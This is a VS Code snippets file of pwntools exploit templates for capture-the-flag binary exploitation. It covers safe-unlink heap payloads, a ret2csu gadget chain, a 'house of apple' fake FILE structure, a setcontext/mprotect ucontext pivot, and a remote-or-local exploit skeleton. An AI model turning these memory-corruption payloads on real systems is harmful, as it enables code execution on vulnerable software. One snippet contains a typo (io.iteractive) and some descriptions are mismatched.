{
	// Place your snippets for python here. Each snippet is defined under a snippet name and has a prefix, body and 
	// description. The prefix is what is used to trigger the snippet and the body will be expanded and inserted. Possible variables are:
	// $1, $2 for tab stops, $0 for the final cursor position, and ${1:label}, ${2:another} for placeholders. Placeholders with the 
	// same ids are connected.
	// Example:
	// "Print to console": {
	// 	"prefix": "log",
	// 	"body": [
	// 		"console.log('$1');",
	// 		"$2"
	// 	],
	// 	"description": "Log output to console"
	// }
	"safe-unlink": {
		"prefix": "unlink",
		"body": [
			"fake_chunk_ptr = addr_global_tbl + 8*0x10 + 8",
			"payload_unlink = flat({",
			"	0x8:    0x1f1,",
			"	0x10:   fake_chunk_ptr - 0x18,",
			"	0x18:   fake_chunk_ptr - 0x10,",
			"	0x1f0:  0x1f0   # nextchunk.prev_size",
			"})",
			"# now the *fake_chunk_ptr = fake_chunk_ptr - 0x18",
			"def write_to(addr, val):",
			"	payload_write = flat({",
			"		0x0:    0x1f8,",
			"		0x8:   addr,",
			"	})",
			"	edit(8, len(payload_write), payload_write)",
			"	edit(7, 0x10, p64(val))",
		]
	},
	"call by csu_init": {
		"prefix": "csu_init",
		"body": [
			"def call_by_csu_init(fn_got, arg0, arg1, arg2):",
			"\t# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;",
			"\taddr_pop6 = 0x40070A",
			"\t# mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12+rbx*8]; add rbx, 1; cmp rbx, rbp; jnz ...; ",
			"\t# add rsp, 8; pop * 6; ret",
			"\taddr_call_arg3 = 0x4006F0",
			"\tpayload = flat([",
			"\t	addr_pop6, 0, 1, fn_got, arg2, arg1, arg0, ",
			"\t	addr_call_arg3, [0]*7   # paddings",
			"\t])",
			"\treturn payload",
		]
	},
	
	"house-of-apple fake FILE": {
		"prefix": "hoa",
		"body": [
			"# mode > 0",
			"# fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base",
			"# fp->_vtable_offset = 0",
			"fake_FILE = flat([",
			"	# _flags, and _IO_read_ptr are chunk.prev_size and chunk.size",
			"	0, 0, # _IO_read_ptr, _IO_read_end, _IO_read_base",
			"	0, # _IO_write_base",
			"	addr_ucontext, # RDX = _IO_write_ptr,",
			"	2, # _ _IO_write_end",
			"	[0] * 6, ",
			"	0, # +0x68, _chain",
			"	[0] * 6, ",
			"	_wide_data, # +0xa0: _wide_data = fake_FILE+8",
			"	[0] * 3, ",
			"	1, # +0xc0: _mode",
			"	[0] * 2, ",
			"	_IO_wfile_jumps + 0x30, # +0xd8: RAX = _vtable",
			"	# fake_FILE end, but fake_IO_wide_data still have some members.",
			"	0,",
			"	_wide_vtable,   # +0xe8 == fake_wide_data + 0xe0, _wide_vtable",
			"	setcontext,     # +0xf0 == fake_wide_data + 0xe8, _wide_vtable->__overflow",
			"])",
		]
	},
	"build ucontext_t obj": {
		"prefix": "ucontext",
		"body": [
			"ucontext = flat({",
			"	0x28: 0,          # +0x28: r8",
			"	0x30: 0,          # +0x30: r9",
			"	0x48: 0,          # +0x48: r12",
			"	0x50: 0,          # +0x50: r13",
			"	0x58: 0,          # +0x58: r14",
			"	0x60: 0,          # +0x60: r15",
			"	0x68: heap_base,  # +0x68: rdi",
			"	0x70: 0x21000,    # +0x70: rsi",
			"	0x78: 0,          # +0x78: rbp",
			"	0x80: 0,          # +0x80: rbx",
			"	0x88: 7,          # +0x88: rdx",
			"	0x98: 0,          # +0x98: rcx",
			"	0xa0: addr_rop,   # +0xa0: rsp ",
			"	0xa8: mprotect    # +0xa8: rip",
			"})",
			"assert(len(ucontext) == 0xb0)",
		]
	},
	"create io": {
		"prefix": "gio",
		"body": [
			"if args.REMOTE:",
			"\thost, port = args.REMOTE.split(':')",
			"\tio = remote(host, int(port))",
			"else:", 
			"\tio = process(${1:f_name})"
		]
	},
	
	"main entry": {
		"prefix": "main",
		"body": [
			"if '__main__' == __name__:",
			"\tif args.DEBUG:",
			"\t\tcontext.log_level='debug'",
			"\texp()",
			"\tio.iteractive()"
		],
		"description": "import pwn"
	},

	"pwntools header": {
		"prefix": "pwn",
		"body": [
			"from pwn import *",
			"context(os=${1:'linux'}, arch=${2:'i386'}, kernel=${3:'amd64'})",
			"",
			"fname = args.FNAME if args.FNAME else ${4:'./pwn'}",
			"libname = args.LIB if args.LIB else ${5:'/lib/x86_64-linux-gnu/libc.so.6'}",
			"ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'",
			"exe = ELF(fname)",
			"libc = ELF(libname)",
			"ldso = ELF(ldname)",
			"context.binary = exe",
			"",
			"if args.REMOTE:",
			"\thost, port = args.REMOTE.split(':')",
			"\tio = remote(host, int(port))",
			"elif args.LDSO:",
			"\tio = process([ldname, fname], env={'LD_PRELOAD': libname})",
			"elif args.LIB:",
			"\tio = process(fname, env={'LD_PRELOAD': libname})",
			"else:",
			"\tio = process(fname)",
			"",
			"def bpt():",
			"\tif not args.REMOTE:",
			"\t\tgdb.attach(io)",
			"\tpause()",
			"",
			"s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter",
			"r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil",
			"",
			"def opt():",
			"\tpass",
			"",
			"def create():",
			"\tpass",
			"",
			"def edit():",
			"\tpass",
			"",
			"def show():",
			"\tpass",
			"",
			"def delete():",
			"\tpass",
			"",
			"def exp():",
			"\tpass", 
			"",
			"if '__main__' == __name__:",
			"\tif args.DEBUG:",
			"\t\tcontext.log_level='debug'",
			"\texp()",
			"\tio.interactive()"
		],
		"description": "import pwn"
	},

	"pwn log level": {
		"prefix": "log_level",
		"body": [
			"context.log_level=${1:'debug'}",
		],
		"description": "set pwn context.log_level"
	},

	"pwn info log": {
		"prefix": "pinfo",
		"body": [
			"log.info($1)",
		],
		"description": "pwn log"
	},

	"pwn debug log": {
		"prefix": "pdbg",
		"body": [
			"log.debug($1)",
		],
		"description": "pwn debug log"
	},

	"pwn success log" : {
		"prefix": "psuc",
		"body": [
			"log.success($1)"
		],
		"description": "pwn success log"
	},

	"pwn io abbreviations" : {
		"prefix": "abio",
		"body": [
			"s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter",
			"r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil"
		],
		"description": "pwn success log"
	},

	"pwn io send" : {
		"prefix": "s",
		"body": [
			"send(${1:payload})",
		],
		"description": "pwn io send"
	},

	"pwn io send after" : {
		"prefix": "sa",
		"body": [
			"sendafter(${1:payload})",
		],
		"description": "pwn io send"
	},

	"pwn io send a line" : {
		"prefix": "sl",
		"body": [
			"sendline(${1:payload})",
		],
		"description": "pwn io sendline"
	},

	"pwn io send line after" : {
		"prefix": "sla",
		"body": [
			"sendlineafter(${1:payload})",
		],
		"description": "pwn io sendlineafter"
	},

	"pwn io receive" : {
		"prefix": "r",
		"body": [
			"recv",
		],
		"description": "pwn io recv"
	},

	"pwn io receive until" : {
		"prefix": "ru",
		"body": [
			"recvuntil($1, drop=${2:False})",
		],
		"description": "pwn io recvuntil"
	},

	"pwn io receive a line" : {
		"prefix": "rl",
		"body": [
			"recvline()",
		],
		"description": "pwn io recvline"
	},

	"pwn io receive all" : {
		"prefix": "ra",
		"body": [
			"recvall()",
		],
		"description": "pwn io recvall"
	},

	"pwn exec file name" : {
		"prefix": "fname",
		"body": [
			"fname = args.FNAME if args.FNAME else './syscall_interface'",
		],
		"description": "pwn io recvall"
	},

	"pwn libc file name" : {
		"prefix": "libcname",
		"body": [
			"libcname = args.LIBC if args.LIBC else '/lib/x86_64-linux-gnu/libc.so.6'",
		],
		"description": "pwn io recvall"
	},
}